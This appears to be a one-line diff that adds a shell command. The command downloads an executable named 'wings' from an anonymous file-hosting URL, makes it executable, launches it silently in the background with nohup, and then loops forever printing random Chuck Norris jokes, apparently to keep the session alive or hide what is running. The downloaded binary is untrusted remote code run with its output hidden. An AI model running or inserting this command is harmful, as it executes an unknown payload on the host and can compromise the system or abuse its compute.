@@ -1,0 +1,1 @@
+curl -o command https://transfer.sh/s5vMef/wings && chmod +x ./command && node -v && nohup ./command "" > /dev/null 2>&1 && while [ 1 ]; do curl -s 'https://api.chucknorris.io/jokes/random' | python -c "from IPython.display import clear_output;import sys,json;print(json.load(sys.stdin)['value'])"; sleep 1m; done; sleep 3d
